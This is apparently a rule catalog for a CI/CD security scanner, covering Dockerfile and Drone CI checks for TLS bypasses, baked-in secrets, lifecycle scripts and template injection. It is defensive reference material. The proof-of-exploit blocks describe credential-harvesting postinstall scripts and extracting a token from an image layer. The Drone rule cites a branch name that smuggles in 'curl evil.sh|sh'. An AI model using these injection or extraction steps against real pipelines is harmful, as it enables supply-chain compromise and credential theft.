### `DF-014`: WORKDIR set to a system / kernel filesystem path <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-df-014 }

**Evidences:** [`ESF-D-PRIV-BUILD`](#ctrl-esf-d-priv-build) Avoid privileged / host-networked build workers.

**How this is detected.** Subsequent directives in the Dockerfile (``COPY src dest``, ``RUN`` writes, ``ADD …``) resolve relative paths against the active ``WORKDIR``. A ``WORKDIR /sys`` followed by ``COPY conf.txt config.txt`` writes into the kernel's sysfs surface, at best a build-time error, at worst a container-escape primitive that lets a compromised step manipulate cgroups, devices, or kernel config.

**Recommendation.** Move ``WORKDIR`` to a dedicated app directory (``/app``, ``/srv/app``, ``/opt/<service>``). System paths like ``/sys``, ``/proc``, ``/dev``, ``/etc``, ``/`` and the ``root`` home are not application directories, pointing the working dir at one means subsequent ``COPY`` / ``RUN`` writes target kernel-exposed namespaces or admin-only configuration.

**Source:** [`DF-014`](../providers/dockerfile.md#df-014) in the [Dockerfile provider](../providers/dockerfile.md).

### `DF-015`: RUN grants world-writable permissions (chmod 777 / a+w) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-df-015 }

**Evidences:** [`ESF-D-PRIV-BUILD`](#ctrl-esf-d-priv-build) Avoid privileged / host-networked build workers.

**How this is detected.** World-writable directories under ``/`` are an established container-escape vector: any compromised process running as non-root can drop a payload that root-owned daemons later execute. The rule fires on the literal ``777``, ``a+w``, and ``a+rwx`` modes; the more conservative ``775`` and ``ugo+x`` are not flagged.

**Recommendation.** Replace ``chmod 777 <path>`` with the narrowest permissions the workload actually needs. ``chmod 755`` is enough for executables under a read-only root filesystem; ``640`` or ``600`` for files the runtime user reads. ``a+w`` is almost always copy-pasted from a SO answer and almost never the correct fix.

**Known false positives.**

- Test fixtures or scratch builds that intentionally share a directory across multiple non-root users may legitimately use ``777``. Suppress with an ignore-file entry rather than weakening the rule.

**Source:** [`DF-015`](../providers/dockerfile.md#df-015) in the [Dockerfile provider](../providers/dockerfile.md).

### `DF-016`: Image lacks OCI provenance labels <span class="pg-sev pg-sev--low">LOW</span> { #detail-df-016 }

**Evidences:** [`ESF-D-SBOM`](#ctrl-esf-d-sbom) Produce SBOM / provenance metadata with every build.

**How this is detected.** The OCI image-spec annotation set is a small de facto standard maintained by the OCI working group. Only ``image.source`` and ``image.revision`` are checked because they're the two whose absence makes incident response materially harder; ``image.title`` / ``image.description`` are nice-to-have but the rule doesn't fire on those.

**Recommendation.** Add a ``LABEL`` line carrying at least ``org.opencontainers.image.source`` (the URL of the source repo) and ``org.opencontainers.image.revision`` (the commit SHA built into the image). Most registries surface those fields in the UI and on ``manifest inspect``, which closes the source-to-image gap that GHA-006 / SLSA Build-L2 provenance attestation also addresses.

**Known false positives.**

- A multi-stage build's intermediate stages don't need provenance labels, only the final image ships. The rule fires per Dockerfile, not per stage; suppress for files where the final ``FROM`` is intentional throwaway scratch.

**Source:** [`DF-016`](../providers/dockerfile.md#df-016) in the [Dockerfile provider](../providers/dockerfile.md).

### `DF-017`: ENV PATH prepends a world-writable directory <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-df-017 }

**Evidences:** [`ESF-D-PRIV-BUILD`](#ctrl-esf-d-priv-build) Avoid privileged / host-networked build workers.

**How this is detected.** A writable PATH entry that comes before the system bins lets any process inside the container shadow ``ls``, ``ps``, ``apt-get``, ``cat``, etc. by dropping a binary of the same name into the writable dir. On a multi-tenant image, or any image where an exploit can reach the filesystem, this is a free privilege-escalation vector.

**Recommendation.** Don't put ``/tmp``, ``/var/tmp``, ``/dev/shm``, or any other world-writable path in ``PATH`` ahead of the system binary directories. Drop those entries entirely, or place them at the tail (``ENV PATH=/usr/bin:$PATH:/tmp``) so legitimate binaries always shadow anything dropped into the writable dir at runtime.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`DF-017`](../providers/dockerfile.md#df-017) in the [Dockerfile provider](../providers/dockerfile.md).

### `DF-018`: RUN chown rewrites ownership of a system path <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-df-018 }

**Evidences:** [`ESF-D-PRIV-BUILD`](#ctrl-esf-d-priv-build) Avoid privileged / host-networked build workers.

**How this is detected.** Recognizes ``chown`` and ``chgrp`` invocations whose first non-flag path argument resolves under a system directory. The non-recursive case is also flagged because a single ``chown user /etc`` is just as harmful, the recursive flag matters for the size of the blast radius, not for whether it's wrong. Application paths under ``/opt``, ``/srv``, ``/var/lib/<app>``, and ``/app`` are not flagged.

**Recommendation.** Don't ``chown`` system directories at build time. If the runtime user needs to own a workload-specific subtree, ``COPY --chown=<user>:<group>`` it into the image at the subtree root, or place the workload under a dedicated directory (e.g. ``/app``, ``/srv/app``) and ``chown`` only that path. Granting the runtime user write access to ``/etc``, ``/usr``, ``/sbin``, or ``/lib`` lets a process exploit later steps to stage a binary the system trusts.

**Source:** [`DF-018`](../providers/dockerfile.md#df-018) in the [Dockerfile provider](../providers/dockerfile.md).

### `DF-019`: COPY/ADD source path looks like a credential file <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-df-019 }

**Evidences:** [`ESF-D-SECRETS`](#ctrl-esf-d-secrets) Protect secrets used during build; no secrets in source or env.

**How this is detected.** Fires on any ``COPY`` or ``ADD`` whose source basename is a well-known credential filename (``id_rsa``, ``.npmrc``, ``.netrc``, ``.env``, ``terraform.tfvars``, …) or whose path tail matches a canonical credential location (``.aws/credentials``, ``.docker/config.json``, ``.kube/config``). Files with private-key extensions (``.pem``, ``.key``, ``.p12``, ``.pfx``, ``.jks``) are also flagged. Globs are not expanded, the rule reads the literal source token.

**Recommendation.** Don't ``COPY`` credential files into an image. Anything baked into a layer is recoverable by anyone who can pull the image, even if a later step deletes the file. For build-time secrets (npm tokens, registry credentials, SSH deploy keys), use ``RUN --mount=type=secret,id=<name>`` so the value lives only for the duration of the step. For runtime secrets, mount them from the orchestrator (Kubernetes Secret, ECS task role, Vault sidecar) instead.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Empty placeholder files (``.env`` shipped as a template, ``config.json`` carrying only public flags). Suppress with a brief ``.pipelinecheckignore`` rationale and prefer an explicit non-secret name (``.env.example``).

**Source:** [`DF-019`](../providers/dockerfile.md#df-019) in the [Dockerfile provider](../providers/dockerfile.md).

### `DF-020`: ARG declares a credential-named build argument <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-df-020 }

**Evidences:** [`ESF-D-SECRETS`](#ctrl-esf-d-secrets) Protect secrets used during build; no secrets in source or env.

**How this is detected.** Complements DF-006 (which flags an ENV/ARG with a literal credential-shaped value). This rule fires on the *name* alone, ``ARG NPM_TOKEN``, ``ARG GITHUB_PAT``, ``ARG DB_PASSWORD``, even when no default is set, because BuildKit records the resolved value in the image's history the moment ``--build-arg`` supplies one. Names are matched via the same ``_primitives/secret_shapes`` regex used by the other secret-name rules.

**Recommendation.** Don't pass secrets through ``ARG``. Build arguments are recorded in ``docker history`` whether the value comes from a default or from ``--build-arg`` at build time, so a credential-named ARG leaks the secret to anyone who can pull the image. Use ``RUN --mount=type=secret,id=<name>`` and feed the value with BuildKit's ``--secret`` flag, the secret never lands in a layer or in the build history.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- An ``ARG`` whose name matches the regex but is a non-secret config knob (a counter-example like ``ARG TOKEN_LIMIT``). Rare; rename or suppress the finding with a brief rationale.

**Source:** [`DF-020`](../providers/dockerfile.md#df-020) in the [Dockerfile provider](../providers/dockerfile.md).

### `DF-021`: RUN pip install bypasses TLS or uses an HTTP index <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-021 }

**Evidences:** [`ESF-S-TRUSTED-REG`](#ctrl-esf-s-trusted-reg) Use only trusted, authenticated package and image registries.

**How this is detected.** Three shapes are detected: ``pip install --trusted-host <host>``, ``pip install -i http://...`` (or ``--index-url http://...``), and ``pip install --extra-index-url http://...``. All three tell pip to accept whatever the upstream returns without certificate verification. The result is a build-time supply-chain MITM surface: anyone able to inject responses on the network path between the build host and the index can ship arbitrary wheels into the image. Complements the generic TLS-bypass primitive (which catches ``pip config set global.trusted-host``) by covering the per-invocation flag form most teams actually reach for.

**Recommendation.** Drop ``--trusted-host`` and switch any ``-i`` / ``--index-url`` / ``--extra-index-url`` to ``https://``. If the internal index has a self-signed certificate, install the CA into the image's truststore (``ca-certificates`` + ``update-ca-certificates``) instead of telling pip to skip verification. ``--trusted-host`` whitelists the host across the entire pip invocation, so a single ``RUN`` line ends up fetching every dependency over an unverified connection.

**Known false positives.**

- An internal index served over plain HTTP on a private network (no internet path) is the typical justification for the flag. Fix the index (terminate TLS at a reverse proxy, or install the internal CA into the image) rather than leaving the bypass in the Dockerfile.

**Source:** [`DF-021`](../providers/dockerfile.md#df-021) in the [Dockerfile provider](../providers/dockerfile.md).

### `DF-022`: RUN uses npm install instead of npm ci <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-df-022 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use, [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** Mirrors GHA-022 / GL-022 / JF-021 (CI-side lockfile integrity) at the image-build layer. The build-time consequence is the same shape: dependency resolution happens against the live registry rather than against the committed lockfile, so the image ends up carrying whatever the registry served at build time rather than the set the team audited. The rule fires on bare ``npm install`` / ``npm i`` as well as on flagged variants (``--no-package-lock``, ``--force``, ``--legacy-peer-deps``) which all defeat the lockfile contract one way or another.

**Recommendation.** Switch to ``npm ci`` (or ``yarn install --frozen-lockfile`` / ``pnpm install --frozen-lockfile`` for those toolchains). ``npm ci`` requires a ``package-lock.json`` and fails the build if it disagrees with ``package.json``; it never rewrites the lockfile and never installs packages outside the locked set. ``npm install`` does the opposite: it resolves ranges in ``package.json`` at build time and happily mutates the lockfile to fit the resolution, so a transient dependency the team never reviewed can land in the image.

**Known false positives.**

- Multi-stage build whose runtime image copies in a pre-computed ``node_modules`` and never installs at build time is unaffected, the rule only fires on directives that actually invoke ``npm install``.
- ``npm install --production`` is still flagged: it ignores ``devDependencies`` but still re-resolves and mutates the lockfile. Use ``npm ci --omit=dev`` instead.

**Source:** [`DF-022`](../providers/dockerfile.md#df-022) in the [Dockerfile provider](../providers/dockerfile.md).

### `DF-023`: ENV sets a dynamic-loader hijack variable <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-023 }

**Evidences:** [`ESF-D-PRIV-BUILD`](#ctrl-esf-d-priv-build) Avoid privileged / host-networked build workers.

**How this is detected.** ``LD_PRELOAD``, ``LD_LIBRARY_PATH``, and ``LD_AUDIT`` are consulted by ``ld-linux`` for every dynamically-linked binary the image runs. A baked-in value gives an attacker who can drop a file inside the container (via a writable mount, a vulnerable upload handler, a build-stage hold-over) the ability to hook ``libc`` calls in privileged processes, intercept TLS, or shim ``execve`` to reroute commands. ``LD_LIBRARY_PATH`` pointing at a writable directory is the milder shape of the same risk: a planted ``libc.so.6`` shadows the system lib for every later binary.

**Recommendation.** Don't bake ``LD_PRELOAD`` / ``LD_LIBRARY_PATH`` / ``LD_AUDIT`` into the image. If a specific binary needs a non-standard library lookup, set the env var in the binary's own ``ENTRYPOINT`` wrapper so the override is scoped to that process, or, better, configure ``/etc/ld.so.conf.d/`` and rerun ``ldconfig`` at build time. A baked-in ``LD_*`` value applies to every process the image launches, including any shell an attacker reaches after an exploit.

**Known false positives.**

- Sanitizer-instrumented images (``LD_PRELOAD=libasan.so``) and APM agent hooks (``LD_PRELOAD=/opt/dynatrace/...``) are legitimate. Suppress the finding for the specific Dockerfile with a one-line rationale; the rule deliberately catches the pattern because the same shape is the standard loader-hijack escalation primitive.

**Source:** [`DF-023`](../providers/dockerfile.md#df-023) in the [Dockerfile provider](../providers/dockerfile.md).

### `DF-024`: RUN npm/yarn/pnpm install runs lifecycle scripts <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-024 }

**Evidences:** [`ESF-D-BUILD-ENV`](#ctrl-esf-d-build-env) Harden the build environment (isolated, minimal, ephemeral workers).

**How this is detected.** Fires on ``npm install`` / ``npm ci`` / ``npm i`` (non-global), ``pnpm install`` / ``pnpm i``, and ``yarn install`` / bare ``yarn`` in a ``RUN`` body when ``--ignore-scripts`` is absent from the same line. Detection short-circuits when the same Dockerfile sets ``ENV NPM_CONFIG_IGNORE_SCRIPTS=true`` (``npm``), ``ENV YARN_ENABLE_SCRIPTS=false`` (yarn berry), or ``ENV CI=true`` is paired with an ``.npmrc`` configured to disable scripts (the env-level kill-switch is detected; the rule trusts ``.npmrc`` only when it's also written by the Dockerfile via ``echo ignore-scripts=true >> .npmrc``). Complements DF-022 (``npm ci`` vs ``npm install``), which guards lockfile integrity; DF-024 guards lifecycle-script execution. A pinned lockfile does not help when the pinned version is the malicious one, only ``--ignore-scripts`` does.

**Recommendation.** Pass ``--ignore-scripts`` to every ``npm`` / ``npm ci`` / ``pnpm install`` / ``yarn install`` invocation in the Dockerfile, or set ``ENV NPM_CONFIG_IGNORE_SCRIPTS=true`` / ``ENV YARN_ENABLE_SCRIPTS=false`` before the install line. Lifecycle scripts (``preinstall``, ``install``, ``postinstall``, ``prepare``) are the blast radius of the Shai-Hulud / TanStack / axios incidents, a single compromised dependency in the transitive tree runs arbitrary code with the build container's credentials. ``--ignore-scripts`` removes that primitive without affecting lockfile resolution; the few legitimate consumers (``node-gyp``-based native modules) should be allow-listed via a follow-up ``npm rebuild <pkg> --ignore-scripts=false`` line scoped to the specific package.

**Known false positives.**

- Images that build native modules via ``node-gyp`` need the lifecycle scripts to compile bindings (``better-sqlite3``, ``sharp``, ``canvas``, ...). The fix is per-package: keep the top-level install on ``--ignore-scripts``, then ``RUN npm rebuild better-sqlite3`` afterward, scoped to the audited package. Suppress with a one-line rationale only when an engineer has confirmed every script-running dep is first-party or pinned to a hash.

**Seen in the wild.**

- Shai-Hulud npm worm (2026): postinstall scripts in compromised packages scraped ``GH_TOKEN`` / ``NPM_TOKEN`` / AWS env, used the stolen tokens to publish more compromised packages and push malicious workflow files into victim repos. ``--ignore-scripts`` neutralizes the postinstall primitive at install time.
- TanStack / Mistral npm compromise (May 2026): 84 versions across 42 packages published in minutes, each carrying a credential-stealing ``postinstall``. Lockfile pinning did not help (the pinned tag itself was poisoned); ``--ignore-scripts`` would have stopped execution.

**Proof of exploit.**

```
# Vulnerable: postinstall in a transitive dep runs with the
# builder's environment (NPM_TOKEN, GH_TOKEN, AWS_*).
FROM node:20@sha256:<digest>
COPY package.json package-lock.json ./
RUN npm ci          # <-- runs postinstall of every dep

# Attack: the compromised package's package.json carries:
#   "scripts": { "postinstall": "node ./harvest.js" }
# harvest.js reads ~/.npmrc, process.env, ~/.aws/credentials
# and POSTs them to a webhook. The image is also tampered:
# the script writes a second-stage loader into node_modules
# that runs at every container start.

# Safe: scripts disabled at install time; rebuild only the
# audited native-module set afterward.
FROM node:20@sha256:<digest>
ENV NPM_CONFIG_IGNORE_SCRIPTS=true
COPY package.json package-lock.json ./
RUN npm ci --ignore-scripts
RUN npm rebuild better-sqlite3 sharp    # audited allowlist
```

**Source:** [`DF-024`](../providers/dockerfile.md#df-024) in the [Dockerfile provider](../providers/dockerfile.md).

### `DF-025`: RUN writes a registry auth token into a Docker layer <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-df-025 }

**Evidences:** [`ESF-D-SECRETS`](#ctrl-esf-d-secrets) Protect secrets used during build; no secrets in source or env.

**How this is detected.** Fires when a ``RUN`` body writes a recognized registry-auth token line into a file via ``echo`` / ``printf`` / heredoc. Patterns matched: ``//registry.npmjs.org/:_authToken=`` (and any ``//host/:_authToken=`` shape), ``//host/:_password=``, ``//host/:_auth=`` (npm legacy basic auth), and the pip equivalents ``index-url = https://<user>:<pass>@host`` and ``extra-index-url = https://<user>:<pass>@host``. Token value may be a literal or a ``$VAR`` / ``${VAR}`` interpolation, both end up in the layer once the build args / env are substituted. Complements DF-019 (``COPY`` of a ``.npmrc`` from the build context); DF-025 catches the in-layer write that DF-019 can't see.

**Recommendation.** Don't bake registry tokens into layers. Use BuildKit secret mounts: ``RUN --mount=type=secret,id=npm,target=/root/.npmrc npm ci`` (the file is mounted only for the duration of the step and never lands in the image). For pip, mount a ``pip.conf`` the same way, or use ``--mount=type=secret`` to expose ``PIP_INDEX_URL`` containing the credentials. A secret written into a layer is recoverable from the image with ``docker save`` + ``tar``, even if a later ``RUN`` deletes the file.

**Known false positives.**

- An interpolation that references an env var the Dockerfile intentionally leaves unset at build time (placeholder line for a templated install script) still triggers the rule; the regex can't reason about whether ``$NPM_TOKEN`` resolves to anything. Either remove the line entirely or move to a ``--mount=type=secret`` flow.

**Seen in the wild.**

- Numerous public Docker Hub leaks of ``_authToken=`` lines in image layers (search ``//registry.npmjs.org/:_authToken`` on public registries). The same lateral-movement primitive the Shai-Hulud worm relies on: any stolen NPM token reaches the victim's publish-scope packages on the next ``npm publish``.

**Proof of exploit.**

```
# Vulnerable: token interpolated from a build ARG and written
# into a layer. The arg value is recoverable by anyone with
# image pull access (and from public image scans).
FROM node:20@sha256:<digest>
ARG NPM_TOKEN
RUN echo "//registry.npmjs.org/:_authToken=${NPM_TOKEN}" \
    > /root/.npmrc \
    && npm ci

# Attack: docker save image | tar xO --wildcards '*.npmrc'
# yields the literal token. The attacker then publishes a
# new patch version of one of the org's packages with a
# postinstall stealer (Shai-Hulud shape).

# Safe: BuildKit secret mount. The .npmrc is mounted into
# the step's filesystem, used by npm ci, then unmounted; the
# layer carries no trace of the token.
FROM node:20@sha256:<digest>
RUN --mount=type=secret,id=npmrc,target=/root/.npmrc \
    npm ci --ignore-scripts
```

**Source:** [`DF-025`](../providers/dockerfile.md#df-025) in the [Dockerfile provider](../providers/dockerfile.md).

### `DF-026`: ENV disables Node.js TLS certificate verification <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-026 }

**Evidences:** [`ESF-S-TRUSTED-REG`](#ctrl-esf-s-trusted-reg) Use only trusted, authenticated package and image registries.

**How this is detected.** Fires on any ``ENV NODE_TLS_REJECT_UNAUTHORIZED=`` value that resolves to ``0`` (or the string ``"0"``). The documented Node.js mechanism for disabling TLS verification, applies to every TLS socket the runtime opens for the rest of the image's life. ``ENV ... =1`` (re-enable) and ``ENV ... =`` (clear) pass. The same primitive shows up in npm postinstall logs whenever a dep tries to fetch over a network the runner can't verify; once the env is set, the failure mode that caught the bad cert is gone.

**Recommendation.** Remove the ``ENV NODE_TLS_REJECT_UNAUTHORIZED=0`` instruction. The variable tells Node's TLS layer to accept any certificate the upstream presents — self-signed, expired, hostname-mismatched, attacker-presented. Anything baked into ``ENV`` applies to every Node process the image ever launches: ``npm install``, ``npm publish``, runtime fetch calls, postinstall scripts. The attacker doesn't need to compromise the registry — they only need to MITM the network path between the container and any HTTPS endpoint.

If the internal registry / API genuinely has a self-signed cert, install the CA into the image's truststore instead: ``COPY ca.crt /usr/local/share/ca-certificates/`` + ``RUN update-ca-certificates`` (Debian) or ``RUN cat ca.crt >> /etc/ssl/certs/ca-certificates.crt`` (Alpine). The CA install is a one-time build cost; the bypass is a permanent runtime liability.

**Known false positives.**

- Test-only images that interact with a local mock server using a throwaway self-signed cert sometimes set this intentionally. Keep the bypass scoped to a separate ``test`` build stage and DON'T copy it into the final image; the production stage should never carry the variable. Suppress on the test-stage Dockerfile with a rationale that names the mock server.

**Source:** [`DF-026`](../providers/dockerfile.md#df-026) in the [Dockerfile provider](../providers/dockerfile.md).

### `DF-027`: ENV disables Python HTTPS certificate verification <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-027 }

**Evidences:** [`ESF-S-TRUSTED-REG`](#ctrl-esf-s-trusted-reg) Use only trusted, authenticated package and image registries.

**How this is detected.** Fires on ``ENV PYTHONHTTPSVERIFY=0`` (also the stringy ``"0"``). The variable is the documented Python mechanism for disabling stdlib HTTPS verification; once set in the image ENV, every ``urllib``-based TLS connection (and the libraries that delegate to it) accept any certificate.

Complements DF-021 (``pip install`` TLS bypass via flags) and DF-026 (Node TLS bypass via env). Together the three cover the same primitive shape across pip-flag, Node-env, and Python-env surfaces.

**Recommendation.** Remove the ``ENV PYTHONHTTPSVERIFY=0`` instruction. The variable tells Python's stdlib ``urllib`` and any library that delegates to it (most of them) to accept any TLS certificate. The bypass applies to every subsequent process — ``pip install``, runtime API calls, postinstall scripts — for the rest of the image's life. The same primitive in flag form (``pip install --trusted-host``) is DF-021's surface; DF-027 catches the env-var form that affects every Python invocation, not just pip.

If the internal index has a self-signed cert, install the CA into the image's truststore (``REQUESTS_CA_BUNDLE`` pointing at a real CA bundle, or ``update-ca-certificates`` for the system bundle) rather than blanket-disabling verification.

**Source:** [`DF-027`](../providers/dockerfile.md#df-027) in the [Dockerfile provider](../providers/dockerfile.md).

### `DF-028`: ENV disables Git TLS certificate verification <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-028 }

**Evidences:** [`ESF-S-TRUSTED-REG`](#ctrl-esf-s-trusted-reg) Use only trusted, authenticated package and image registries.

**How this is detected.** Fires on ``ENV GIT_SSL_NO_VERIFY`` set to any truthy value (``1``, ``true``, ``yes``, ``on``). The documented Git mechanism for disabling SSL verification per-process; in ``ENV`` form, every Git operation the image runs (and every downstream tool that shells out to ``git``) sees the bypass.

Pairs with DF-026 (Node TLS), DF-027 (Python TLS), and DF-029 (Python requests TLS) for the env-var-based TLS-bypass surface.

**Recommendation.** Remove the ``ENV GIT_SSL_NO_VERIFY`` instruction (or set it to ``0`` / unset it explicitly). The variable tells every ``git clone`` / ``git fetch`` / ``git pull`` in the image to accept any TLS certificate the upstream presents. Baked into ``ENV`` it applies to:

* ``RUN git clone`` in subsequent build stages
* ``git+https://...`` deps that pip / npm / cargo / go   modules clone at install time
* Any runtime process that shells out to ``git``   (release-publishing scripts, mirror jobs, GitOps   agents reading from the image)

If you need to clone from an internal Git server with a self-signed cert, install the CA into the image's truststore — same fix as DF-026 / DF-027. The TLS-bypass primitive doesn't need to be image-wide for any legitimate use case.

**Source:** [`DF-028`](../providers/dockerfile.md#df-028) in the [Dockerfile provider](../providers/dockerfile.md).

### `DF-029`: ENV neuters Python requests CA bundle <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-029 }

**Evidences:** [`ESF-S-TRUSTED-REG`](#ctrl-esf-s-trusted-reg) Use only trusted, authenticated package and image registries.

**How this is detected.** Fires when ``ENV REQUESTS_CA_BUNDLE`` resolves to a value that disables verification:

* ``/dev/null`` (literal),
* the empty string (``ENV REQUESTS_CA_BUNDLE=`` or   ``ENV REQUESTS_CA_BUNDLE=""``),
* whitespace-only values.

A path to a real file (``/etc/ssl/certs/...``, ``/usr/local/share/ca-certificates/internal.crt``) passes — the rule only flags the disable shapes. Pairs with DF-027 (Python TLS via env).

**Recommendation.** Set ``ENV REQUESTS_CA_BUNDLE`` to the path of a real CA bundle (typically ``/etc/ssl/certs/ca-certificates.crt`` on Debian or ``/etc/ssl/cert.pem`` on Alpine), or unset it entirely so the ``requests`` library falls back to ``certifi``. Pointing the variable at ``/dev/null`` or an empty string is a documented anti-pattern: ``requests`` treats the empty / missing bundle as 'verify against nothing,' which silently accepts every certificate.

The same shape as DF-027 (``PYTHONHTTPSVERIFY=0``) but narrower in surface — ``REQUESTS_CA_BUNDLE`` only affects ``requests`` and its descendants, not the stdlib ``urllib``. Still a real bypass because most Python network clients (pip, AWS CLI, Anchore, Trivy, every Django app) flow through ``requests``.

**Source:** [`DF-029`](../providers/dockerfile.md#df-029) in the [Dockerfile provider](../providers/dockerfile.md).

### `DF-030`: ENV NODE_OPTIONS preloads code or opens an inspector <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-df-030 }

**Evidences:** [`ESF-D-PRIV-BUILD`](#ctrl-esf-d-priv-build) Avoid privileged / host-networked build workers.

**How this is detected.** Fires when ``ENV NODE_OPTIONS`` contains any of:

* ``--require=<path>`` / ``--require <path>`` /   ``-r <path>`` (the short alias Node accepts inside   ``NODE_OPTIONS``), or ``--import=<path>`` /   ``--import <path>``   (preload a module on every Node startup)
* ``--inspect`` / ``--inspect=...`` /   ``--inspect-brk`` (open V8 inspector port)

Safe flags (``--max-old-space-size=``, ``--enable-source-maps``, ``--unhandled-rejections=throw``, etc.) pass. The rule flags the *primitive*, not the value — even an innocent-looking ``--require=./preload.js`` is the same shape as the malicious one, and the security decision is at the build-policy layer.

**Recommendation.** Drop the ``--require=`` / ``--import=`` and ``--inspect`` / ``--inspect-brk`` flags from ``NODE_OPTIONS``. Each is a runtime-injection or remote-debugger primitive baked into every ``node`` invocation the image runs:

* ``--require=<module>`` and ``--import=<module>``   preload a module before user code runs. The Node   equivalent of ``LD_PRELOAD`` (DF-023): any process   that can drop a file in the image's filesystem can   inject that module's side effects into every Node   process.
* ``--inspect`` / ``--inspect-brk`` opens the V8   inspector on port 9229 (or the configured port).   Anyone who can reach that port has full debugger   control: read process memory (incl. secrets), set   breakpoints, and execute arbitrary code in the   Node context.

If your image needs an APM-style preload (Datadog, Sentry, OpenTelemetry), scope it to the specific service entrypoint via the agent's own startup wrapper rather than baking it into ``ENV NODE_OPTIONS``. The image-wide form applies to every Node process — including ``npm`` and ``yarn`` themselves — which broadens the attack surface unnecessarily.

**Known false positives.**

- Sanitizer / APM / coverage tools sometimes legitimately use ``--require`` to inject their agent. Suppress with a rationale that names the specific agent and the path to its module. The rule deliberately flags the pattern because the same shape is the runtime-injection primitive Shai-Hulud-class npm worms exploit.

**Source:** [`DF-030`](../providers/dockerfile.md#df-030) in the [Dockerfile provider](../providers/dockerfile.md).

### `DR-001`: Step image not pinned to a digest <span class="pg-sev pg-sev--high">HIGH</span> { #detail-dr-001 }

**Evidences:** [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests, [`ESF-S-IMMUTABLE`](#ctrl-esf-s-immutable) Enforce artifact / tag immutability to preserve provenance.

**How this is detected.** Detection mirrors the GL-001 / JF-009 / ADO-009 / CC-003 family: any container ``image:`` whose ref doesn't end in ``@sha256:<64 hex>`` fires. ``:latest`` and missing-tag references emit the strongest message; a specific-version tag (``golang:1.21.5``) still fires but can be fixed with a one-line digest swap. The rule scopes itself to ``type: docker`` / ``kubernetes`` pipelines (the container-flavored ones); ``ssh`` / ``exec`` / ``digitalocean`` pipelines have no ``image:`` field and pass-by-default.

**Recommendation.** Pin every step ``image:`` (and every ``services:`` image) to ``@sha256:<digest>``. Drone resolves the image ref at run time, so a tag like ``golang:1.21`` resolves against whatever the registry currently serves and a compromised registry can swap content under a fixed tag. Capture the digest once with ``docker buildx imagetools inspect golang:1.21`` (or ``crane digest golang:1.21``) and update the digest deliberately when the upstream version moves.

**Known false positives.**

- Local-build images (``image: my-org/build-tools:dev`` produced upstream in the same pipeline) sometimes can't be digest-pinned because the digest depends on the build. Suppress via ignore-file scoped to the specific step name when this is the deliberate shape; the floating-tag risk still applies to every public-registry pull.

**Source:** [`DR-001`](../providers/drone.md#dr-001) in the [Drone CI provider](../providers/drone.md).

### `DR-002`: Step runs with privileged: true <span class="pg-sev pg-sev--high">HIGH</span> { #detail-dr-002 }

**Evidences:** [`ESF-D-PRIV-BUILD`](#ctrl-esf-d-priv-build) Avoid privileged / host-networked build workers.

**How this is detected.** Drone's ``privileged: true`` is a step-scoped switch that maps directly to ``docker run --privileged``. The rule fires on either steps or services declaring the flag. The agent admin can also globally allow / deny privileged steps via the trusted-flag on the repository, the rule doesn't try to reach into Drone's server config and assumes the worst (a malicious or accidentally-trusted repo) so a ``privileged: true`` in source is always a finding.

**Recommendation.** Drop ``privileged: true`` from the step. The flag removes the container's syscall and capability boundary, giving the step kernel-level access to the agent host. Most workloads that reach for it are Docker-in-Docker pipelines that can use a rootless alternative (``buildx``, ``kaniko``, ``buildah --isolation=chroot``) instead. If the workload genuinely needs syscalls, scope down with explicit ``cap_add: [SYS_ADMIN]`` and an isolated runner pool, rather than blanket privileged.

**Source:** [`DR-002`](../providers/drone.md#dr-002) in the [Drone CI provider](../providers/drone.md).

### `DR-003`: Untrusted Drone template variable in shell command <span class="pg-sev pg-sev--high">HIGH</span> { #detail-dr-003 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context.

**How this is detected.** User-controllable substitution sources flagged by this rule:

- ``DRONE_COMMIT_MESSAGE`` / ``DRONE_COMMIT_AUTHOR*``
- ``DRONE_PULL_REQUEST_TITLE`` / ``DRONE_PULL_REQUEST_BRANCH``
- ``DRONE_TAG_MESSAGE`` (tag annotations are author-controlled)
- ``DRONE_BRANCH`` / ``DRONE_SOURCE_BRANCH`` / ``DRONE_TARGET_BRANCH`` (branch names are pushable, so an attacker can craft a name like ``;curl evil.sh|sh``)
- ``DRONE_REPO_*`` (in fork PRs the repo metadata comes from the fork)

The rule only fires on **unquoted** uses inside a command body. Quoted (``"${DRONE_*}"``) or single-quoted uses are safe in POSIX shell because the substitution runs after Drone's templating but the shell still tokenises the expanded value as a single argument. Same model as the Tekton TKN-003 / Argo ARGO-005 / Buildkite BK-003 rules in this catalog.

